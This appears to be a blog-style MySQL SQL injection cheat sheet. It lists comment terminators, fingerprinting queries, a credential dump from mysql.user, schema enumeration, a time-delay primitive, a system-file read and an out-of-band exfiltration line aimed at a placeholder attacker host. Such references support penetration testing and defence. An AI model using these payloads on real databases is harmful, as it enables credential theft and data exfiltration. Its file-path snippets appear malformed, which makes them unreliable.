---
title: MYSQL
date: 2017-05-13 16:52:33
---

## Comments
``` sql
#
/* */ 
-- -
;%00
```

## Version
``` sql
SELECT VERSION();
SELECT @@VERSION;
SELECT @@GLOBAL.VERSION;
```

## User details
``` sql
user()
current_user()
system_user()
session_user()
SELECT user,password FROM mysql.user;
```

## Database details
``` sql
SELECT db_name();
SELECT database();
SELECT schema_name FROM information_schema.schemata;
```

## Database credentials
``` sql
SELECT host, user, password FROM mysql.user;
```

## Server details
``` sql
SELECT @@hostname;
```

## Table Name
``` sql
SELECT table_name FROM information_schema.tables;
```

## Columns Names
``` sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';
```

## No Quotes
``` sql
CONCAT(CHAR(97), CHAR(98), CHAR(99))
```

## String Concatenation
``` sql
CONCAT(foo, bar)
```

## Conditionals
``` sql
SELECT IF(1=1,'true','false');
```

## Time-delay
``` sql
Sleep(10)
```

## Read Files
``` sql
SELECT LOAD_FILE('C:Windowswin.ini');
```

## Out-of-Band Retrieval
``` sql
SELECT LOAD_FILE(concat("\\",(SELECT 1), "attacker-server.com\");
```

## Substrings
``` sql
SELECT substr('Foobar', 1, 1);
```

## Retrieve Nth Line
``` sql
SELECT * FROM table ORDER BY ID LIMIT 3,1
```
